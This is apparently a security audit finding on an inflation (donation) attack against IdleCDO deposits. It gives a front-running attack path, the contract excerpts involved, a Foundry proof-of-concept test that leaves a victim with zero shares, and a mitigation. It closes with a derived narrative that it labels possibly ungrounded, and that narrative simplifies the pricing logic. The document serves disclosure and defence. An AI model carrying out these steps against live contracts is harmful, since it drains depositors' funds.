---
id: 1950
severity: "High"
---

# Depositing to IdleCDO is vulnerable to inflation attacks

## Description

Depositing to IdleCDO is vulnerable to inflation attacks. Attacker can inflate the share price to a very big value by donating assets into contract and then user's would lose their assets while depositing assets in contract.
main/idle-tranches/contracts/IdleCDO.sol#L270
hShah1923/blob/main/idle-tranches/contracts/IdleCDO.sol#L315
Internal Pre-conditions
External Pre-conditions
Total Supply of LP token should be Zero
Attack Path
• When total supply is zero an attacker goes ahead and executes the following steps :
– Deposit a few assets (1 wei) through depositAA() or depositBB()
– Since Attacker is the first depositor (totalSupply is 0 && totalAssets is 0), attacker gets minted 1 wei of a share
– Afterwards the attacker would wait for user who wants to deposit some number of assets.
– Let's suppose Bob wants to deposit 10e18 underlying asset.
– Now attacker would see the transaction in mempool and frontrun the Bob's transaction and donates 100e18 underlying assets to contract thus inflating the total assets in contract.
– Now when attacker transaction gets executed he would be minted 0 shares in against of providing 10e18 due to inflation of shares in contract so a total loss of 10e18 to user.
– After that attacker claims his 1 share worth of 110e18 + 1 of underlying assets.
– Let me dig more deeper why this would happen.
– During Deposit through depositAA() or depositBB() _deposit() gets called where first we transfer underlying token to IdleCDOEpochVariant(IdleCDO) contract.
```solidity
function _deposit(uint256 _amount, address _tranche, address _referral)
internal virtual whenNotPaused returns (uint256 _minted) {
    if (_amount == 0) {
        return _minted;
    }
    // check that we are not depositing more than the contract available limit
    _guarded(_amount);
    // set _lastCallerBlock hash
    _updateCallerBlock();
    // check if _strategyPrice decreased
    _checkDefault();
    // interest accrued since last depositXX/withdrawXX/harvest is splitted between AA and BB
    // according to trancheAPRSplitRatio. NAVs of AA and BB are updated and tranche
    // prices adjusted accordingly
    _updateAccounting();
    // check if depositor has enough stkIDLE for the amount to be deposited
    _checkStkIDLEBal(_tranche, _amount);
    // get underlyings from sender
    address _token = token;
    uint256 _preBal = _contractTokenBalance(_token);
    IERC20Detailed(_token).safeTransferFrom(msg.sender, address(this), _amount);
    // mint tranche tokens according to the current tranche price
    _minted = _mintShares(_contractTokenBalance(_token) - _preBal, msg.sender, _tranche);
    // update trancheAPRSplitRatio
    _updateSplitRatio(_getAARatio(true));
    if (directDeposit) {
        IIdleCDOStrategy(strategy).deposit(_amount);
    }
    if (_referral != address(0)) {
        emit Referral(_amount, _referral);
    }
}
```
– After that _mintShares() gets called with the amount of assets we have passed.
– Inside _mintShares we have to inflate tranchePrice so that user would get mint zero shares.
```solidity
function _tranchePrice(address _tranche) internal view returns (uint256) {
    if (IdleCDOTranche(_tranche).totalSupply() == 0) {
        return oneToken;
    }
    return _tranche == AATranche ? priceAA : priceBB;
}
```
– We have to inflate priceAA or priceBB according to the tranche.
– This price have been updated in _updateAccounting()
```solidity
function _updateAccounting() internal virtual {
    uint256 _lastNAVAA = lastNAVAA;
    uint256 _lastNAVBB = lastNAVBB;
    uint256 _lastNAV = _lastNAVAA + _lastNAVBB;
    uint256 nav = getContractValue();
    uint256 _aprSplitRatio = trancheAPRSplitRatio;
    // If gain is > 0, then collect some fees in `unclaimedFees`
    if (nav > _lastNAV) {
        unclaimedFees += (nav - _lastNAV) * fee / FULL_ALLOC;
    }
    (uint256 _priceAA, int256 _totalAAGain) = _virtualPriceAux(AATranche, nav, _lastNAV, _lastNAVAA, _aprSplitRatio);
    (uint256 _priceBB, int256 _totalBBGain) = _virtualPriceAux(BBTranche, nav, _lastNAV, _lastNAVBB, _aprSplitRatio);
    lastNAVAA = uint256(int256(_lastNAVAA) + _totalAAGain);
    // if we have a loss and it's gte last junior NAV we trigger a default
    if (_totalBBGain < 0 && -_totalBBGain >= int256(_lastNAVBB)) {
        // revert with 'default' error (4) if skipDefaultCheck is false, as seniors will have a loss too not covered.
        require(skipDefaultCheck, "4");
        // This path will be called when a default happens and guardian calls
        // `updateAccounting` after setting skipDefaultCheck or when skipDefaultCheck is already set to true
        lastNAVBB = 0;
        // if skipDefaultCheck is set to true prior a default (eg because AA is used as collateral and needs to be liquid),
        // emergencyShutdown won't prevent the current deposit/redeem (the one that called this _updateAccounting) and is
        // still correct because:
        // - depositBB will revert as priceBB is 0
        // - depositAA won't revert (unless the loss is 100% of TVL) and user will get correct number of share at a priceAA already post junior default
        // - withdrawBB will redeem 0 and burn BB tokens because priceBB is 0
        // - withdrawAA will redeem the correct amount of underlyings post junior default
        // We pass true as we still want AA to be redeemable in any case even after a junior default
        _emergencyShutdown(true);
    } else {
        // we add the gain to last saved NAV
        lastNAVBB = uint256(int256(_lastNAVBB) + _totalBBGain);
    }
    priceAA = _priceAA;
    priceBB = _priceBB;
}
```
– The priceAA and priceBB gets updated in _virtualPriceAux and the main root cause is that while calculating _virtualPriceAux nav gets calculated using balanceOf(address(this)) which is where the main problem is. uint256 nav = getContractValue();
```solidity
function _contractTokenBalance(address _token) internal view returns (uint256) {
    return IERC20Detailed(_token).balanceOf(address(this));
}
```
– Due to this attacker can inflate the share price by donating.
• This attack has two implications: Implicit minimum Amount and funds lost due to rounding errors
– If an attacker is successful in making 1 share worth z assets and a user tries to mint shares using k*z assets then,
* If k<1, then the user gets zero share and they loose all of their tokens to the attacker
* If k>1, then users still get some shares but they lose (k- floor(k)) * z) of assets which get proportionally divided between existing share holders (including the attacker) due to rounding errors.
* This means that for users to not lose value, they have to make sure that k is an integer.

## Proof of Concept

• Add this test inside IdleCreditVault.t.sol and change USDC aadress to DAI address 0x6B175474E89094C44Da98b954EedeAC495271d0F address internal constant USDC = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
```solidity
function testShareInflationViaDonating() external
{
    // Attacker deposits 1wei of Underlying Token
    uint256 amount = 1;
    vm.startPrank(address(attacker));
    // Approving assets
    underlying.approve(address(idleCDO), type(uint).max);
    // Depositing to AA tranche
    idleCDO.depositAA(amount);
    assertEq(IdleCreditVault(address(strategy)).totEpochDeposits(), amount, "totEpochDeposits after AA deposit");
    // Attacker then donating 100e18 underlying asset
    IERC20Detailed(USDC).transfer(address(idleCDO),100e18);
    vm.stopPrank();
    // Now Users transaction gets executed
    vm.startPrank(address(user));
    // approving tokens
    underlying.approve(address(idleCDO), type(uint).max);
    // User deposits 10e18 assets
    idleCDO.depositAA(10e18);
    vm.stopPrank();
    assertEq(idleCDO.getContractValue(),110000000000000000001);
    //User gets minted 0 shares
    assertEq(IERC20(AAtranche).balanceOf(address(user)),0);
    assertEq(IERC20(AAtranche).balanceOf(address(attacker)),1);
}
```

## Recommendation

• I like how BalancerV2 and UniswapV2 do it. some MINIMUM amount of shares get burnt when the first mint happens.

## Derived Narrative

The following field is derived content and may not be source-grounded:

Depositing to the IdleCDO contract suffers from a share‑price inflation vulnerability that can be exploited when the total supply of a tranche token is zero. The contract determines the price of each tranche by dividing the contract’s token balance (obtained via balanceOf(address(this))) by the total supply of the tranche. Because the balance includes any tokens transferred directly to the contract, an attacker can first make a minimal deposit (for example 1 wei) to obtain a single share, then transfer a large amount of the underlying asset to the contract before another user’s deposit is processed. This external donation inflates the reported tranche price; when the subsequent user’s deposit is executed the _mintShares function calculates the number of shares as deposited amount divided by the inflated price, which can result in zero shares being minted. From the user’s perspective the transaction succeeds but the user receives no tranche tokens and their underlying assets are effectively lost, appearing as funds disappear or refund missing. The attack requires the tranche’s totalSupply to be zero, the attacker to be the first depositor, and the ability to front‑run the victim’s transaction, conditions that are common during the initial bootstrapping of a new tranche. The issue was discovered during a manual audit and reproduced with a test that donates assets after the first mint. It is hard to notice because the contract’s external view of total assets shows a higher value, giving the impression of healthy liquidity, while the internal accounting for share issuance is broken. The vulnerability belongs to the class of price‑manipulation or inflation attacks caused by using mutable on‑chain balances for price calculations without isolating external transfers. The impact includes loss of user deposits, distortion of accounting, and potential rounding losses for non‑integer multiples of the inflated price. Mitigation involves preventing the first mint from using a zero‑supply price, enforcing a minimum amount of shares to be minted on the initial deposit, or computing NAV based on internal accounting that excludes unsolicited token transfers. Implementing a minimum share burn or ignoring direct token donations in the price formula would close the attack vector.
